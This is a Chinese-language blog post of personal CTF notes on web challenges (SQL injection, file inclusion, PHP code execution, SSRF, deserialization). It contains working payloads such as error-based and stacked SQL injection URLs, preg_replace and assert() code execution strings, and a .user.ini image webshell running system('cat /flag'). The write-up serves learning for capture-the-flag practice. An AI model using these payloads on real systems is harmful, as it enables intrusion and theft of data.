<!DOCTYPE html>
<html>
  <!-- Html Head Tag-->
  <head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content>
  <meta name="author" content="disshu">
  <!-- Open Graph Data -->
  <meta property="og:title" content="CTF比赛随记(持续更新)">
  <meta property="og:description" content>
  <meta property="og:site_name" content="disshu">
  <meta property="og:type" content="article">
  <meta property="og:image" content="http://yoursite.com">
  
    <link rel="alternate" href="/atom.xml" title="disshu" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  

  <!-- Site Title -->
  <title>disshu</title>

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="/disshu.github.io/css/bootstrap.min.css">
  <!-- Custom CSS -->
  
  <link rel="stylesheet" href="/disshu.github.io/css/style.dark.css">

  <!-- Google Analytics -->
  

</head>

  <body>
    <!-- Page Header -->


<header class="site-header header-background" style="background-image: url(/disshu.github.io//img/cumt.png)">
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="page-title with-background-image">
          <p class="title">CTF比赛随记(持续更新)</p>
          <p class="subtitle"></p>
        </div>
        <div class="site-menu with-background-image">
          <ul>
            
              <li>
                <a href="/disshu.github.io/">
                  
                  Home
                  
                </a>
              </li>
            
              <li>
                <a href="/disshu.github.io/archives">
                  
                  Archives
                  
                </a>
              </li>
            
              <li>
                <a href="https://github.com/disshu">
                  
                  Github
                  
                </a>
              </li>
            
              <li>
                <a href="mailto:15695257867@163.com">
                  
                  Email
                  
                </a>
              </li>
            
          </ul>
        </div>
      </div>
    </div>
  </div>
</header>

<article>
  <div class="container typo">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="post-info text-muted">
          
            <!-- Author -->
            <span class="author info">By disshu</span>
          
          <!-- Date -->
          <span class="date-time info">On
            <span class="date">2018-10-15</span>
            <span class="time">07:52:31</span>
          </span>
          
          <!--  Categories  -->
            <span class="categories info">Under 

<a href="/disshu.github.io/categories/随记/">随记</a>
</span>
          
        </div>
        <!-- Tags -->
        
          <div class="post-tags text-muted">
            Tags: 

<a class="tag" href="/disshu.github.io/tags/CTF/">#CTF</a>


          </div>
        
        <!-- Post Main Content -->
        <div class="post-content">
          <p>做题积累日常</p>
<a id="more"></a>
<p><strong>新手区(攻防世界)</strong></p>
<p>1.X-Forwarded-For:发送的真实的ip地址<br>2.referer:返回来源地址<br>3.X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项<br>4.HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的<br>遇到编码unicode，先用python脚本解开试试<br>5.find / -name flag.txt<br>使用find按文件名来查找语法：find / -name 文件名;<br><strong>cat(攻防世界)</strong><br>总结<br>1.如果对于正常表达式，结果无效的话，就出现了过滤<br>这时候我们就可以用fuzzing测试来判断过滤了哪些字符，常用办法就是用bp构造字典，来进行爆破<br>2.宽字节报错，其实我们在构造字典的时候放几个宽字节,有可能php或django后台的编码有问题，会报错<br>3.curl命令处理，curl命令是以file=@文件的格式上传，这道题就利用了文件包含漏洞去读取，读取的时候前面要加上@<br>4.flag一般都在对方的数据库，所以我们读取文件不知道怎么下手的时候一定要尽量找到对方的数据库文件<br>ice-05(攻防世界)<br>1.用dirsearch.py扫描目录，找到有漏洞的网站<br>2.php://filter/read=convert.base64-encode/resource=xxxxx.php(文件包含漏洞专用)<br>3./e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码(在适当的逆向引用替换完之后)。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p>
<pre><code class="hljs undefined"><span class="hljs-keyword">if</span> ($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="hljs-string">'127.0.0.1'</span>) &#123;

    echo <span class="hljs-string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[<span class="hljs-function"><span class="hljs-keyword">sub</span>]</span>;

    <span class="hljs-keyword">if</span> (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;
        preg_replace($pattern, $replacement, $subject);
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">die</span>();
    &#125;

&#125;</code></pre>

<p>payload如下<br>1.把X-Forwarded-For换成127.0.0.1<br>2.<code>?pat=/test/e&amp;rep=phpinfo()&amp;sub=just test</code><br>pat是正则匹配模式，sub是字符串。rep是替换的内容<br><strong>php之assert()</strong></p>
<p>bool assert(mixed $assertion[,string,$description])，如果assertion是字符串，他会被assert()当做php代码执行。 思路是通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码。<br>‘) or phpinfo();# ——即变成file_exists(‘’) or phpinfo();# ，结果为执行phpinfo()，注意要url编码，本处为了方便阅读，以编码前显示<br>‘) or print_r(file_get_contents(‘templates/flag.php’);# ——然后在源代码里（临门一脚不要被坑了） 即最终payload:?page=’)%20or%20print_r(file_get_contents(‘templates%2fflag.php’))%3b%23<br><strong>文件泄漏</strong><br>.rar   .zip  .7z   .tar.gz   .bak    .swp   .txt   .sql<br>##sql注入<br>报错注入<br>select concat(floor(rand(0)乘2),”======”,(查询语句)) as xx，count(1),3 from xxx group by xx<br>函数报错注入<br>1=(updatexml(1,concat(0x3a,(查询语句)),1))<br>其中的一个万能密码，如果数据库中存在比较<br><code>if(md5($pw)==$password)</code><br>如果查询的回显值select 1,2,3#,其中1的字段为id,2的字段为user,3的字段为password，那我们就可以通过构造字符串来绕过比较得到flag，例如<br><code>pw=123//这个是我们自己构造的</code><br><code>/*那么可以构造sql语句,查询123的md5,通过字符串的方式写入sql语句，那么sql后台会返给这个语句给php,md5($pw)和$password比较,前提这个第二个字段的user一定要传对,一定是正确的用户名*/</code></p>
<h1 id="sql注入-updatexml"><a href="#sql注入-updatexml" class="headerlink" title="sql注入 updatexml"></a>sql注入 updatexml</h1><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>然后咱们再看看语句：<br><code>http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code><br>CONCAT(str1,str2,…)<br>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。<br>通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。<br>错误大概会是：<br><code>ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</code><br>例如最近的北京工业的比赛，一道sql注入</p>
<h1 id="爆数据库-http-172-21-4-12-10012-search-php-name-admin-df-27-and-updatexml-1-concat-1-database-1-–-amp-pw-y1ng"><a href="#爆数据库-http-172-21-4-12-10012-search-php-name-admin-df-27-and-updatexml-1-concat-1-database-1-–-amp-pw-y1ng" class="headerlink" title="爆数据库 http://172.21.4.12:10012/search.php?name=admin%df%27 and updatexml(1,concat(1,database()),1) –+&amp;pw=y1ng"></a>爆数据库 <a href="http://172.21.4.12:10012/search.php?name=admin%df%27" target="_blank" rel="noopener">http://172.21.4.12:10012/search.php?name=admin%df%27</a> and updatexml(1,concat(1,database()),1) –+&amp;pw=y1ng</h1><h1 id="Error-XPATH-syntax-error-‘web-sqli’"><a href="#Error-XPATH-syntax-error-‘web-sqli’" class="headerlink" title="Error: XPATH syntax error: ‘web_sqli’"></a>Error: XPATH syntax error: ‘web_sqli’</h1><h1 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h1><p><a href="http://172.21.4.12:10012/search.php?name=admin%df%27" target="_blank" rel="noopener">http://172.21.4.12:10012/search.php?name=admin%df%27</a> and updatexml(1,concat(1, (seSELECTlect group_concat(table_name) from information_schema.tables whWHEREere table_schema=database() limit 0,1)),1) –+&amp;pw=y1ng</p>
<h1 id="Error-XPATH-syntax-error-‘f14g-user’"><a href="#Error-XPATH-syntax-error-‘f14g-user’" class="headerlink" title="Error: XPATH syntax error: ‘f14g,user’"></a>Error: XPATH syntax error: ‘f14g,user’</h1><h1 id="HCTF"><a href="#HCTF" class="headerlink" title="HCTF"></a>HCTF</h1><pre><code class="hljs undefined"><span class="hljs-variable">$_page</span> = urldecode(<span class="hljs-variable">$page</span>);
            <span class="hljs-variable">$_page</span> = mb_substr(
                <span class="hljs-variable">$_page</span>,
                0,
                mb_strpos(<span class="hljs-variable">$_page</span> . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)
            );
            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
                <span class="hljs-built_in">return</span> <span class="hljs-literal">true</span>;
            &#125;
            <span class="hljs-built_in">echo</span> <span class="hljs-string">"you can't see it"</span>;
            <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;</code></pre>

<pre><code class="hljs undefined">这道题是一道代码审计题，也是个文件包含题，目的是绕过函数从而执行后面的文件
传入 file=<span class="hljs-built_in">hint</span>.php ，在第一个 in_array 处会返回 <span class="hljs-literal">true</span>，然后直接包含 <span class="hljs-built_in">hint</span>.php
传入 file=<span class="hljs-built_in">hint</span>.php?/../cookie.txt ，在第二个 in_array 处会返回<span class="hljs-literal">true</span>，第二个 in_array
中的 <span class="hljs-variable">_page</span> 为 <span class="hljs-built_in">hint</span>.php ，然后包含 <span class="hljs-built_in">hint</span>.php?/../cookie.txt ，但是这里的?
起到传递参数的作用而不是破坏路径.传入 file=<span class="hljs-built_in">hint</span>.php%<span class="hljs-number">253</span>f/../cookie.txt ，在第三个 in_array 处会返回 <span class="hljs-literal">true</span> ，第三个 
in_array 中的 <span class="hljs-variable">_page</span> 为 <span class="hljs-built_in">hint</span>.php ，然后包含 <span class="hljs-built_in">hint</span>.php%<span class="hljs-number">3</span>f/../cookie.txt ，这里的 %<span class="hljs-number">3</span>f 即 
? ，破坏了路径，前面部分的路径不存在，可以包含后面的文件.这个看到file一定要想到文件包含 想办法</code></pre>

<h1 id="强网杯-随便注"><a href="#强网杯-随便注" class="headerlink" title="强网杯 随便注"></a>强网杯 随便注</h1><p>又是涨知识的一道题，这道题用了堆叠注入,就是分开查询,因为这道题都过滤了<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>所以就想到堆叠注入<br><code>1&#39;;show databases;#</code><br><code>1&#39;;show tables;#</code><br><code>1&#39;;show columns from xxxxx;#</code><br>因为这里有两张表，回显内容肯定是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢<br>我们首先要把第一个表名改成其他的,把有flag的表名改成默认的查询的表这里也就是word表,在把flag换成id或者data因为不知道后台代码 where id=’xxxx’或data=’xxxx’<br>MySQL中反引号和单引号的区别与用法<br>    MySql 中用一对反引号来标注 SQL 语句中的标识，如数据库名、表名、字段名等<br>    引号则用来标注语句中所引用的字符型常量或日期/时间型常量，即字段值<br>    例如：select * from <code>username</code> where <code>name</code>=”peri0d”<br>    MySQL 的 show、rename 和 alter 命令<br>    show 可以用于查看当前数据库，当前表，以及表中的字段<br>    rename 用于修改 table 的名称<br>    alter 用于修改表中字段的属性<br>攻击思路：默认查询 words 表，可以将数字表的名称改成 words，这样就可以 使用 or ‘1’=’1 直接查询 flag 了<br>payloads</p>
<pre><code class="hljs undefined">?inject=1';<span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`words`</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">`words1`</span>;<span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`1919810931114514`</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">`words`</span>;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`words`</span> <span class="hljs-keyword">CHANGE</span> <span class="hljs-string">`flag`</span> <span class="hljs-string">`id`</span> <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> words;%23</code></pre>

<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>这道题是服务器模版注入攻击<br>然而我们是怎么判断的呢,因为参数后面的内容就是回显的内容,再加一点他是render渲染的就更加明确了这一点<br><code>$temp-&gt;render(&quot;Hello &quot;.$_GET[&#39;username&#39;]);</code><br>通过查阅在handler指向的处理当前这个页面的RequestHandler对象，<br>RequestHandler.settings指向self.application.settings，<br>因此handler.settings指向RequestHandler.application.settings。</p>
<h1 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy sql"></a>easy sql</h1><p>利用mysqli_multi_query()函数就支持多条sql语句同时执行,所以看到这个就要用堆叠注入<br>源码</p>
<pre><code class="hljs undefined">$sql = <span class="hljs-string">"select "</span>.$post[<span class="hljs-string">'query'</span>].<span class="hljs-string">"||flag from Flag"</span><span class="hljs-comment">;</span>
        mysqli_multi_query($MysqlLink,$sql)<span class="hljs-comment">;</span></code></pre>

<p>我们可以通过<br><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code><br>使得||变成&amp;&amp;,就可以查询<br>非预期解<br><code>*，1</code><br><code>变成了select *,1||flag from Flag</code></p>
<h1 id="hctf-admin"><a href="#hctf-admin" class="headerlink" title="hctf admin"></a>hctf admin</h1><p>unicode欺骗</p>
<pre><code class="hljs undefined">ᴀ -&gt; A -&gt; a
ᴀdmin -&gt; Admin -&gt; admin</code></pre>

<p>首先看到代码<br><code>nodeprep.prepare</code><br>在twisted中版本过低有unicode编码漏洞,所以我们可以注册ᴀdmin并且修改密码,拿到真正的admin</p>
<h1 id="clac计算"><a href="#clac计算" class="headerlink" title="clac计算"></a>clac计算</h1><pre><code class="hljs 这是别人对PHP字符串解析漏洞的理解，">我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过:</code></pre>

<pre><code class="hljs undefined">/news.php?%20news[id%00=<span class="hljs-number">42</span><span class="hljs-string">"+AND+1=0–

上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</span></code></pre>

<pre><code class="hljs undefined">当我们给定一个参数时,num会有waf,所以我可以在num前面加个空格,解析时是一样的,然后可以在后面执行系统语句
当执行到当前目录时,有的会绕过所以我们可以用acsii码绕过
<span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">(<span class="hljs-string">"/"</span>)</span></span>,但是“/”被过滤了，所以我们用chr(“<span class="hljs-number">47</span>”)绕过,发现flagg文件</code></pre>

<h1 id="burpsiute不断发包"><a href="#burpsiute不断发包" class="headerlink" title="burpsiute不断发包"></a>burpsiute不断发包</h1><p>这个一开始是我的知识盲区,其实就是普通的攻击模块不设payloads而已,具体步骤如下<br>首先我们需要把所有的payload清除<br><img src="https://img-blog.csdnimg.cn/2020012015304978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="1"><br>然后设置攻击模式为null payloads<br>payload options设为continue indefinitely<br><img src="https://img-blog.csdnimg.cn/20200120153354950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="2"><br>最后设置线程,这个是最重要的否则会造成dos<br>number of threads 设为1<br>throttle设为2500 也就是2.5s发一个<br><img src="https://img-blog.csdnimg.cn/20200120153524533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="3"></p>
<h1 id="user-ini-checkin"><a href="#user-ini-checkin" class="headerlink" title=".user.ini(checkin)"></a>.user.ini(checkin)</h1><p>这道题运用的是.user.ini这个和.hatacess是一个性质,都是为了将上传的图片马转换为php代码解析<br>还有一个小知识点绕过php的exif_imagetype()函数，这个很好绕过，添加图片文件头就可以了<br><code>GIF98a</code><br>如果.hatacess无效的话用如下<br>大致意思就是:我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php),类似于在index.php中插入一句：require(./a.jpg);<br>而user.ini的应用环境如下<br>    服务器脚本语言为PHP<br>    服务器使用CGI／FastCGI模式<br>    上传目录下要有可执行的php文件<br>代码如下<br><code>GIF89a
auto_prepend_file=a.jpg</code><br>对方服务器一定要有php代码才能执行<br>再将a.jpg上传<br>`GIF89a</p>
<script language="php">system('cat /flag');</script>`
<p>盲注脚本放到web工具里看返回时bool类型吗<br>绕过空格用() tab</p>
<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>Python 2.x - 2.7.16 urllib.fopen支持local_file导致LFI(CVE-2019-9948)<br>可以用local_file:// 去访问目录,例如local_file:///app/flag.txt<br>flask的app路由要会读代码</p>
<pre><code class="hljs undefined">&lt;?php
// 漏洞代码ssrf.php
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $_GET['url']); 
<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">curl_setopt</span><span class="hljs-params">($<span class="hljs-variable">ch</span>, <span class="hljs-variable">CURLOPT_FOLLOWLOCATION</span>, 1)</span></span>;
curl_setopt($ch, CURLOPT_HEADER, 0); 
<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">curl_setopt</span><span class="hljs-params">($<span class="hljs-variable">ch</span>, <span class="hljs-variable">CURLOPT_PROTOCOLS</span>, <span class="hljs-variable">CURLPROTO_HTTP</span> | <span class="hljs-variable">CURLPROTO_HTTPS</span>)</span></span>;
curl_exec($ch); 
curl_close($ch); 
?&gt;</code></pre>

<h1 id="java文件泄露-java-特有的-遇见java可以尝试"><a href="#java文件泄露-java-特有的-遇见java可以尝试" class="headerlink" title="java文件泄露(java 特有的 遇见java可以尝试)"></a>java文件泄露(java 特有的 遇见java可以尝试)</h1><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：<br> /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>    /WEB-INF/database.properties：数据库配置文件<br>get 请求不到 就用post请求</p>
<h1 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h1><p>首先为了逃过get或post参数的长度限制(正则表达式) 可以传数组<br>反序列化逃逸是什么呢 可以通过构造语句来改变序列化参数的值<br>一道ctf为例,我们要改photo的值,使其指向flag.php<br>首先简单介绍反序列化<br>序列化</p>
<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
$a = <span class="hljs-keyword">array</span>(<span class="hljs-string">'123'</span>, <span class="hljs-string">'abc'</span>, <span class="hljs-string">'hu'</span>);
var_dump(serialize($a));
<span class="hljs-meta">?&gt;</span></span></code></pre>

<p>结果<br><code>string(49) &quot;a:3:{i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:2:&quot;hu&quot;;}&quot;</code><br>反序列化</p>
<pre><code class="hljs undefined">&lt;?php
<span class="hljs-regexp">//</span><span class="hljs-variable">$a</span> = array(<span class="hljs-string">'123'</span>, <span class="hljs-string">'abc'</span>, <span class="hljs-string">'hu'</span>);
<span class="hljs-regexp">//</span>var_dump(serialize(<span class="hljs-variable">$a</span>));
<span class="hljs-regexp">//</span><span class="hljs-string">"a:3:&#123;i:0;s:3:"</span><span class="hljs-number">123</span><span class="hljs-string">";i:1;s:3:"</span>abc<span class="hljs-string">";i:2;s:2:"</span>h<span class="hljs-string">u";&#125;"</span>
<span class="hljs-variable">$b</span> = <span class="hljs-string">'a:3:&#123;i:0;s:3:"123";i:1;s:3:"abc";i:2;s:2:"hu";&#125;'</span>;
var_dump(unserialize(<span class="hljs-variable">$b</span>));
?&gt;</code></pre>

<p>结果<br><code>array(3) { [0]=&gt; string(3) &quot;123&quot; [1]=&gt; string(3) &quot;abc&quot; [2]=&gt; string(2) &quot;hu&quot; }</code><br>其实我们可以构造”;}<br>  我们把第二个值abc换成abc”;i:2;s:5:”qwert”* ;}<br><code>array(3) { [0]=&gt; string(3) &quot;123&quot; [1]=&gt; string(3) &quot;abc&quot; [2]=&gt; string(4) &quot;defg&quot; }</code><br>那么之后的hu就被遗弃了<br>那么怎么让qwert被逃逸呢 注意遗弃和逃逸不一样 逃逸还能被识别<br>我们可以在前面的长度动手脚 前面增加的长度等于后面的逃逸长度<br>例如要逃逸如下代码 长度为33<br><code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;flag.php&quot;;}</code><br>那么前面的s就要增加33位,如题所示(0CTF 2016]piapiapia)<br>where select一些敏感字会被替换成hacker 那我们就多加33个where<br>增加s的数量=33乘hacker 因为是被替换的<br>33个where+”;s:5:”photo”;s:10:”flag.php”;} photo就会被解析成flag.php<br>但此题有些小技巧</p>
<pre><code class="hljs undefined">之前我传入的是";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:"photo"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:"flag.php"</span>;&#125;结果失败了，看了网上的一些文章，发现他们传入的是";&#125;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:"photo"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:"flag.php"</span>;&#125;为什么前面要多加一个&#125;，后来发现是因为我们<span class="hljs-selector-tag">nickname</span>构造成了数组，而不是字符，所以要加&#125;闭合一下。</code></pre>

<p>所以是34个where</p>

        </div>
      </div>
    </div>
  </div>
</article>



    <!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <p class="copyright text-muted">
          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
        <p class="copyright text-muted">
          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
        </p>
      </div>
    </div>
  </div>
</footer>


    <!-- After Footer Scripts -->
<script src="/disshu.github.io/js/highlight.pack.js"></script>
<script>
  document.addEventListener("DOMContentLoaded", function(event) {
    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
    codeBlocks.forEach(function(block, index) {
      hljs.highlightBlock(block);
    });
  });
</script>

  </body>
</html>

